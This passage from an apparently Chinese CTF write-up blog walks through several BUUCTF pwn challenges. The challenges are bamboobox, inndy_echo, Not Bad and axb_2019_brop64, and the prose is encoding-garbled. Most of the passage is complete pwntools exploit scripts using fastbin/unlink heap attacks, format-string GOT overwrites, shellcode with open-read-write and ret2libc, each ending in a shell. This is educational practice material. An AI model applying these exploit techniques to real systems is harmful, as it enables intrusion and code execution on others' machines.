(0x400000)</span><br></pre></td></tr></table></figure><p>editä¸­å¯¹è¾“å…¥çš„é•¿åº¦æ²¡æœ‰åšæ£€æŸ¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">change_item</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the index of item:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v1 = atoi(buf);</span><br><span class="line">    <span class="keyword">if</span> ( *&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of item name:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">      v2 = atoi(nptr);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new name of the item:&quot;</span>);</span><br><span class="line">      *(*&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>] + read(<span class="number">0</span>, *&amp;itemlist[<span class="number">4</span> * v1 + <span class="number">2</span>], v2)) = <span class="number">0</span>;<span class="comment">//è¿™é‡Œç›´æ¥æ˜¯æŒ‰ç…§è¾“å…¥çš„æ¥è¯»å–</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invaild index&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No item in the box&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteæ²¡æœ‰é—®é¢˜</p><h2 id="è§£æ³•ä¸€ï¼ˆå¯¹buuæ— ç”¨ï¼‰"><a href="#è§£æ³•ä¸€ï¼ˆå¯¹buuæ— ç”¨ï¼‰" class="headerlink" title="è§£æ³•ä¸€ï¼ˆå¯¹buuæ— ç”¨ï¼‰"></a>è§£æ³•ä¸€ï¼ˆå¯¹buuæ— ç”¨ï¼‰</h2><p>fastbin attack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x21</span>,<span class="string">&#x27;AAAAA&#x27;</span>)<span class="comment">#0  </span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;BBBBB&#x27;</span>)<span class="comment">#1  </span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;CCCC&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#ä¸ºäº†æº¢å‡ºä¿®æ”¹1</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#fastbin -&gt; 1 -&gt; 2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x21</span>) <span class="comment">#ä¿®æ”¹1çš„fdæŒ‡é’ˆï¼ŒæŒ‡å‘mainå¼€å§‹æ—¶ç”³è¯·çš„å†…å­˜åœ°å€</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload) </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;AAA&#x27;</span>)   </span><br><span class="line">    </span><br><span class="line">backdoor = <span class="number">0x0400D49</span> </span><br><span class="line">add(<span class="number">0x18</span>,p64(<span class="number">0</span>)+p64(backdoor))  <span class="comment">#å°†å…¶ç¬¬äºŒä¸ªæŒ‡é’ˆä¿®æ”¹ä¸ºbackdoorçš„åœ°å€.</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h2><p>unlink</p><blockquote><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><ol><li> UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ smallbin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ</li><li> å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk</li></ol><h3 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h3><p>  ä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>  è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptr</p><ol><li> ä¿®æ”¹ fd ä¸º ptr - 0x18</li><li> ä¿®æ”¹ bk ä¸º ptr - 0x10</li><li> è§¦å‘ unlink</li></ol><p>  ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26791</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;item:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">itemlist0_ptr = <span class="number">0x6020C0</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;A&#x27;</span> * <span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;B&#x27;</span> * <span class="number">8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;C&#x27;</span> * <span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿™é‡Œæˆ‘ä»¬ç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ (æ£€æŸ¥på’Œå…¶å‰åçš„chunkæ˜¯å¦æ„æˆåŒå‘é“¾è¡¨)</span></span><br><span class="line">fake_chunk =  p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)  <span class="comment">#fake_chunk header</span></span><br><span class="line">fake_chunk += p64(itemlist0_ptr-<span class="number">0x18</span>) + p64(itemlist0_ptr-<span class="number">0x10</span>) <span class="comment">#fake_chunk fd  bk</span></span><br><span class="line">fake_chunk += <span class="string">&#x27;C&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>) <span class="comment"># 1çš„presize </span></span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>) <span class="comment"># 1çš„size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,fake_chunk)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¿™é‡Œç”¨pæŒ‡ä»£itemlist0_ptr</span></span><br><span class="line"><span class="string">FD = p -&gt; fd = p - 0x18</span></span><br><span class="line"><span class="string">BK = p -&gt; bk = p - 0x10</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">FD -&gt; bk = p</span></span><br><span class="line"><span class="string">BK -&gt; fd = p</span></span><br><span class="line"><span class="string">#é€šè¿‡æ£€æŸ¥</span></span><br><span class="line"><span class="string">FD -&gt; bk = BK ç›¸å½“äº  *(p) = p-0x10</span></span><br><span class="line"><span class="string">BK -&gt; fd = FD ç›¸å½“äº  *(p) = p-0x18</span></span><br><span class="line"><span class="string">æˆ‘ä»¬æŠŠpçš„å€¼æ”¹ä¸ºäº†pçš„åœ°å€-0x18,ä½¿å¾—pçš„å€¼ä¸å†æ˜¯å †çš„åœ°å€ï¼Œè€Œæ˜¯itemlisté™„è¿‘çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">delete(<span class="number">1</span>)  <span class="comment">#å‰å‘åˆå¹¶ï¼Œåˆå¹¶0ä¸­çš„fake_chunk  æ”¾å…¥ unsorted bin ä¸­ ,åŒæ—¶ itemlist0_ptr = &amp;itemlist0_ptr -0x18</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x40</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) <span class="comment">#è¦†ç›–çš„itemlist[0]-&gt;ptr ä¸ºatoi_got</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ä¸Šé¢expå†™çš„å¾ˆè¯¦ç»†äº†ã€‚</p><blockquote><p>  <a href="https://www.cnblogs.com/Rookle/p/12942229.html">https://www.cnblogs.com/Rookle/p/12942229.html</a></p></blockquote><h1 id="0x52-inndy-echo-fmt-str"><a href="#0x52-inndy-echo-fmt-str" class="headerlink" title="0x52.inndy_echo(fmt_str)"></a>0x52.inndy_echo(fmt_str)</h1><p>å¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ ./<span class="built_in">echo</span> </span><br><span class="line">aaaa %p %p %p %p %p %p %p %p %p </span><br><span class="line">aaaa 0x100 0xf7f695a0 (nil) 0xf7faf000 0x80482e7 0xf63d4e2e 0x61616161 0x20702520 0x25207025</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸ƒä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&quot;./echo&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29402</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=fmtstr_payload(<span class="number">7</span>,&#123;printf_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x53-æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad-ret2shellcode"><a href="#0x53-æå®¢å¤§æŒ‘æˆ˜-2019-Not-Bad-ret2shellcode" class="headerlink" title="0x53.[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad(ret2shellcode)"></a>0x53.[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad(ret2shellcode)</h1><p>æœ‰0x18çš„æº¢å‡ºï¼Œbufåªæœ‰0x20å¤§å°ä¸å¤Ÿå†™æ ˆè¿ç§»çš„ropã€‚</p><p>ç¨‹åºåœ¨ä¸€å¼€å§‹ï¼š<code>mmap(0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><p>æ‰€ä»¥æ¥ä¸‹æ¥ï¼šåœ¨è¿™é‡Œå†™shellcodeï¼Œè·³è¿‡æ¥æ‰§è¡Œ</p><p>æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ seccomp-tools dump ./bad</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x08 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x05 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0010</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x00000002  <span class="keyword">if</span> (A == open) goto 0009</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">orw_payload=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)           <span class="comment">#æ‰“å¼€æ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶</span></span><br><span class="line">orw_payload+=shellcraft.read(<span class="number">3</span>,mmap,<span class="number">0x50</span>)       <span class="comment">#è¯»å–æ–‡ä»¶æ ‡è¯†ç¬¦æ˜¯3çš„æ–‡ä»¶0x50ä¸ªå­—èŠ‚å­˜æ”¾åˆ°mmapåˆ†é…çš„åœ°å€ç©ºé—´é‡Œ</span></span><br><span class="line">orw_payload+=shellcraft.write(<span class="number">1</span>,mmap,<span class="number">0x50</span>)      <span class="comment">#å°†mmapåœ°å€ä¸Šçš„å†…å®¹è¾“å‡º0x50ä¸ªå­—èŠ‚</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./bad&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26570</span>)</span><br><span class="line">mmap=<span class="number">0x123000</span></span><br><span class="line">jmp_rsp=<span class="number">0x400a01</span></span><br><span class="line"></span><br><span class="line">payload1=asm(shellcraft.read(<span class="number">0</span>,mmap,<span class="number">0x100</span>))+asm(<span class="string">&quot;mov rax,0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1+=p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp,0x30; jmp rsp&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">payload+=shellcraft.read(<span class="number">3</span>,mmap+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">payload+=shellcraft.write(<span class="number">1</span>,mmap+<span class="number">0x100</span>,<span class="number">100</span>)</span><br><span class="line">payload=asm(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>p64(jmp_rsp)+asm(&quot;sub rsp,0x30; jmp rsp&quot;)</code>ï¼Œé¦–å…ˆå°†ripæŒ‡åˆ°æ ˆä¸Šï¼Œç„¶ååé¢å†™çš„jmpå°†ripæŒ‡åˆ°æˆ‘ä»¬å†™çš„shellcodeä¸Š</p><h1 id="0x54-axb-2019-brop64ï¼ˆBROPï¼‰"><a href="#0x54-axb-2019-brop64ï¼ˆBROPï¼‰" class="headerlink" title="0x54.axb_2019_brop64ï¼ˆBROPï¼‰"></a>0x54.axb_2019_brop64ï¼ˆBROPï¼‰</h1><p>è™½ç„¶ç»™äº†elfï¼Œä½†è¿™é¢˜å…¶å®æ˜¯bropçš„é¢˜</p><h2 id="è§£æ³•ä¸€ï¼šret2libc"><a href="#è§£æ³•ä¸€ï¼šret2libc" class="headerlink" title="è§£æ³•ä¸€ï¼šret2libc"></a>è§£æ³•ä¸€ï¼šret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./axb_2019_brop64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29353</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./axb_2019_brop64&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">8</span>) + p64(pop_rdi_ret) +p64(puts_got)+p64(puts_plt)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh =  base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xd0</span>+<span class="number">8</span>) + p64(pop_rdi_ret) +p64(bin_sh)+p64(sys_addr)+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="è§£æ³•äºŒï¼šbrop"><a href="#è§£æ³•äºŒï¼šbrop" class="headerlink" title="è§£æ³•äºŒï¼šbrop"></a>è§£æ³•äºŒï¼šbrop</h2><blockquote><p>  <a href="https://www.anquanke.com/post/id/196722">https://www.anquanke.com/post/id/196722</a></p><p>  <a href="https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html">https://wooyun.js.org/drops/Blind%20Return%20Oriented%20Programming%20(BROP)%20Attack%20-%20%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86.html</a></p><p>  <a href="http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/">http://showlinkroom.me/2017/11/09/pwn%E4%B9%8BBROP/</a></p></blockquote><p>è¾“å…¥%s%pç­‰æµ‹è¯•å‘ç°ä¸æ˜¯fmtstrçš„æ´ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ cyclic 400</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaad</span><br><span class="line">gwt@ubuntu:~/Desktop$ ./axb_2019_brop64 </span><br><span class="line">Hello,I am a computer Repeater updated.</span><br><span class="line">After a lot of machine learning,I know that the essence of man is a reread machine!</span><br><span class="line">So I<span class="string">&#x27;ll answer whatever you say!</span></span><br><span class="line"><span class="string">Please tell 